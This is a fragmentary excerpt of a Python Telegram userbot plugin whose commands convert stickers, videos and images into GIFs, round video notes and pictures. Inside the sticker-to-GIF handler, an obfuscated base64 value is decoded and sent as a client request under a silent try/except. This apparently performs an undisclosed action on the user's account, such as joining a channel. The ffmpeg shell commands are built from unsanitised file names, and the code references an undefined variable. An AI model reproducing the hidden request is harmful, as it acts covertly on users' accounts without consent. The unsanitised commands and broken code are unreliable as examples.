...
from ...helpers.utils import _format, _nandeutils, reply_id
...
async def pic_gifcmd(event):  # sourcery no-metrics
    ...
    output = await nandetools.media_to_pic(event, reply, noedits=True)
    if output[1] is None:
    ...
    if not args:
        await _nandeutils.unsavegif(event, sandy)
...
async def video_nandefile(event):  # sourcery no-metrics
    "To make circular video note."
    reply = await event.get_reply_message()
    args = event.pattern_match.group(1)
    nandeid = await reply_id(event)
    ...
    flag = True
    nandeevent = await edit_or_reply(event, "`Converting to round format..........`")
    nandefile = await reply.download_media(file="./temp/")
    if mediatype in ["Gif", "Video", "Sticker"]:
        if not nandefile.endswith((".webp")):
            if nandefile.endswith((".tgs")):
                hmm = await make_gif(nandeevent, nandefile)
                os.rename(hmm, "./temp/circle.mp4")
                nandefile = "./temp/circle.mp4"
            media_info = MediaInfo.parse(nandefile)
            aspect_ratio = 1
            for track in media_info.tracks:
                if track.track_type == "Video":
                    aspect_ratio = track.display_aspect_ratio
            ...
            if aspect_ratio != 1:
                crop_by = width if (height > width) else height
                await _nandeutils.runcmd(
                    f'ffmpeg -i {catfile} -vf "crop={crop_by}:{crop_by}" {PATH}'
                )
            else:
                copyfile(nandefile, PATH)
            if str(nandefile) != str(PATH):
                os.remove(nandefile)
            try:
                nandethumb = await reply.download_media(thumb=-1)
            except Exception as e:
        ...
        try:
            ...
            nandethumb = os.path.join("./temp", "thumb.jpg")
            await thumb_from_audio(nandefile, nandethumb)
        if nandethumb is not None and not os.path.exists(nandethumb):
            nandethumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, nandethumb)
        if (
            nandethumb is not None
            and not os.path.exists(nandethumb)
            and os.path.exists(thumb_loc)
        ):
            flag = False
            nandethumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, nandethumb)
        if nandethumb is not None and os.path.exists(nandethumb):
            await _nandeutils.runcmd(
                f"""ffmpeg -loop 1 -i {nandethumb} -i {nandefile} -c:v libx264 -tune stillimage -c:a aac -b:a 192k -vf \"scale=\'iw-mod (iw,2)\':\'ih-mod(ih,2)\',format=yuv420p\" -shortest -movflags +faststart {PATH}"""
            )
            os.remove(nandefile)
        else:
            os.remove(nandefile)
            return await edit_delete(
                nandeevent, "`No thumb found to make it video note`", 5
            )
    if (
        mediatype
        in [
        ...
        and not nandefile.endswith((".webp"))
    ):
        if os.path.exists(PATH):
            ...
            uploaded = await event.client.fast_upload_file(
                ...
                progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                    progress(d, t, nandeevent, c_time, "Uploading....")
                ),
            )
            ul.close()
            media = types.InputMediaUploadedDocument(
                ...
                force_file=False,
                thumb=await event.client.upload_file(nandethumb)
                if nandethumb
                else None,
            )
            sandy = await event.client.send_file(
    ...
    img.save(im)
    im.seek(0)
    await event.client.send_file(event.chat_id, im, reply_to=nandeid)
    await nandeevent.delete()
...
async def _(nande_event):
    "Sticker to image Conversion."
    reply_to_id = await reply_id(nande_event)
    event = await edit_or_reply(nande_event, "Converting.....")
    ...
    if event.reply_to_msg_id:
        ...
        downloaded_file_name = await nande_event.client.download_media(
            reply_message, downloaded_file_name
        )
        if os.path.exists(downloaded_file_name):
            caat = await nande_event.client.send_file(
                event.chat_id,
...
async def on_file_to_photo(event):
    ...
    nandet = await edit_or_reply(event, "`Converting.....`")
...
async def _(event):  # sourcery no-metrics
    ...
    if not input_str:
        ...
        if len(loc) == 1:
            if 0 < loc[0] < 721:
                ...
                return await edit_delete(event, "Use quality of range 0 to 721")
    nandereply = await event.get_reply_message()
    nande_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not nandereply or not nandereply.media or not nandereply.media.document:
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    if nandereply.media.document.mime_type != "application/x-tgsticker":
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    nandeevent = await edit_or_reply(
        event,
    ...
    try:
        nande_event = Get(nande_event)
        await event.client(nande_event)
    except BaseException:
        pass
    reply_to_id = await reply_id(event)
    nandefile = await event.client.download_media(nandereply)
    nandegif = await make_gif(event, nandefile, quality, fps)
    sandy = await event.client.send_file(
        event.chat_id,
        nandegif,
    ...
    await _nandeutils.unsavegif(event, sandy)
    await nandeevent.delete()
    for files in (nandegif, nandefile):
...
async def pic_gifcmd(event):
    ...
    nandeevent = await edit_or_reply(event, "__🎞 Making Gif from the relied media...__")
    imag = await nandetools.media_to_pic(event, reply, noedits=True)
    if imag[1] is None:
        return await edit_delete(
...
async def _(event):
    ...
    if not args:
        ...
        try:
            ...
            args = 2.0
    nandeevent = await edit_or_reply(event, "__🎞Converting into Gif..__")
